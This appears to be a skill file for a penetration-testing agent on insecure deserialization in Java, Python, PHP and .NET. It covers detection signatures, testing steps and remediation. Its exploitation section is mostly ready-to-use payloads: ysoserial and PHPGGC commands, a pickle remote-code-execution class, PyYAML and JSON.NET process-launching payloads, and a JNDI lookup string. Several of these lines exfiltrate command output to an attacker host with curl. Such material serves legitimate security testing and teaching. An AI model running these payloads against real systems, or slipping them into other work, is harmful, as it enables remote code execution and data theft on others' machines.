---
name: insecure-deserialization
description: Insecure deserialization testing covering Java, Python, PHP, and .NET gadget chains with detection, exploitation, and RCE techniques
---

# Insecure Deserialization

Insecure deserialization occurs when an application deserializes untrusted data without validation, allowing attackers to manipulate serialized objects to achieve remote code execution, authentication bypass, privilege escalation, or denial of service. The vulnerability is language-specific but the pattern is universal: trusting the structure of incoming serialized data.

## Attack Surface

**Languages**
- Java: `ObjectInputStream`, XML/JSON deserializers with polymorphic type handling
- Python: `pickle`, `yaml.load`, `shelve`, `marshal`
- PHP: `unserialize()`, `phar://` deserialization
- .NET: `BinaryFormatter`, `SoapFormatter`, `JSON.NET` with `TypeNameHandling`, `XmlSerializer`
- Ruby: `Marshal.load`, `YAML.load`

**Contexts**
- Session tokens, cookies, API payloads, message queues, cache stores, file uploads, inter-service communication, ViewState (.NET), RMI/JNDI (Java)

**Detection Points**
- Base64-encoded blobs in cookies/headers/parameters
- Binary data in request bodies
- Content-Type headers indicating serialized formats (`application/x-java-serialized-object`, `application/x-php-serialized`)

**Defenses to Bypass**
- Type allowlists/blocklists, integrity signatures (HMAC), custom deserialization logic, WAF pattern matching

## Detection Signatures

### Java

**Magic bytes**: `AC ED 00 05` (hex) or `rO0AB` (base64 prefix)
- Found in cookies, POST bodies, custom headers, JMX/RMI traffic
- ViewState-like blobs in Java web frameworks (JSF, Apache Wicket)

### Python

**Pickle opcodes**: starts with `\x80` (protocol header) or `cos\n` (older format)
- Base64-encoded pickle in session cookies (Flask with pickle serializer, Django sessions)
- Look for `pickle.loads`, `yaml.load` (without `Loader=SafeLoader`)

### PHP

**Format**: `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}`
- Serialized objects in cookies, session files, cache entries
- `phar://` wrappers trigger deserialization on `file_exists()`, `fopen()`, `file_get_contents()`

### .NET

**Indicators**: `AAEAAAD` (base64 prefix for BinaryFormatter), `__type` field in JSON (TypeNameHandling)
- ViewState without MAC validation
- JSON bodies with `$type` property

## Exploitation

### Java

**ysoserial Gadget Chains:**
```bash
# Generate payload for Apache Commons Collections
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/$(whoami)' | base64

# Common gadget chains
java -jar ysoserial.jar CommonsCollections1 'command'   # commons-collections:3.1
java -jar ysoserial.jar CommonsCollections5 'command'   # commons-collections:3.1 (no InvokerTransformer)
java -jar ysoserial.jar CommonsCollections7 'command'   # commons-collections:3.1
java -jar ysoserial.jar CommonsCollections6 'command'   # commons-collections4:4.0
java -jar ysoserial.jar Hibernate1 'command'            # hibernate-core
java -jar ysoserial.jar Spring1 'command'               # spring-core + spring-beans
java -jar ysoserial.jar JRMPClient 'attacker:port'      # RMI-based
```

**JNDI Injection (Log4Shell-adjacent):**
```
${jndi:ldap://attacker.com/exploit}
```
When deserialization triggers JNDI lookup to attacker-controlled LDAP/RMI.

**Detection via DNS callback:**
```bash
java -jar ysoserial.jar URLDNS 'http://detect.attacker.com' | base64
```
`URLDNS` requires no gadget libraries — uses built-in Java classes. Safe for detection.

### Python

**Pickle RCE:**
```python
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/$(whoami)',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

**YAML RCE (PyYAML < 6.0 with yaml.load):**
```yaml
!!python/object/apply:os.system ['id']
```
```yaml
!!python/object/apply:subprocess.check_output [['id']]
```

### PHP

**Property manipulation:**
```php
O:4:"User":2:{s:4:"role";s:5:"admin";s:8:"is_admin";b:1;}
```

**Gadget chains (PHPGGC):**
```bash
# Generate Laravel RCE payload
phpggc Laravel/RCE1 system 'id' -b

# Generate Monolog payload
phpggc Monolog/RCE1 system 'id' -b

# Common frameworks
phpggc Symfony/RCE4 system 'id' -b
phpggc WordPress/RCE1 system 'id' -b
```

**Phar deserialization:**
Upload a phar file, then trigger deserialization via:
```php
file_exists('phar://uploads/evil.phar/test.txt');
// Also: fopen, file_get_contents, is_dir, is_file, stat, etc.
```

### .NET

**ysoserial.net:**
```bash
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c curl http://attacker.com"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "calc"
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami"
```

**JSON.NET TypeNameHandling:**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd",
      "Arguments": "/c whoami"
    }
  }
}
```

## Testing Methodology

1. **Identify serialized data** — scan cookies, headers, parameters, request bodies for magic bytes and encoding patterns
2. **Determine language/framework** — match serialization format to technology stack
3. **Test with safe payloads first** — use `URLDNS` (Java) or DNS callback payloads to confirm deserialization without impact
4. **Enumerate classpath** — identify available libraries for gadget chain selection
5. **Generate exploitation payload** — use ysoserial/PHPGGC/custom pickle for the target environment
6. **Deliver payload** — replace the serialized blob in the identified transport (cookie, parameter, body)
7. **Verify execution** — confirm via OAST callback, file creation, or command output

## Indicators of Vulnerability

- OAST callback triggered by `URLDNS` or equivalent safe detection payload
- Application deserializes user-controlled data without integrity verification (no HMAC/signature)
- Error messages reveal deserialization stack traces or class loading attempts
- Known vulnerable libraries in classpath (commons-collections, Spring, Hibernate)
- `pickle.loads` or `yaml.load` called on user-controlled input (Python)
- `unserialize()` on user-controlled input without type validation (PHP)

## Remediation

- Never deserialize untrusted data; prefer safe formats (JSON with schema validation)
- Implement integrity checks (HMAC) on all serialized data; validate before deserializing
- Use allowlists for permitted classes during deserialization (Java: `ObjectInputFilter`, .NET: `SerializationBinder`)
- Remove dangerous gadget libraries from classpath when not needed
- Python: use `yaml.safe_load()` instead of `yaml.load()`; avoid `pickle` for untrusted data
- PHP: avoid `unserialize()` on user input; use `json_decode()` instead; disable `phar://` if unnecessary
- .NET: avoid `BinaryFormatter`; use `DataContractSerializer` with known types; set `TypeNameHandling.None` in JSON.NET
- Apply defense-in-depth: network segmentation, least-privilege, monitoring for deserialization gadget execution patterns

## Summary

Insecure deserialization turns data parsing into code execution. Identify serialized blobs by magic bytes and encoding patterns, match to the technology stack, and leverage language-specific gadget chains. The safest fix is to eliminate untrusted deserialization entirely; when not possible, enforce strict type allowlists and integrity verification.
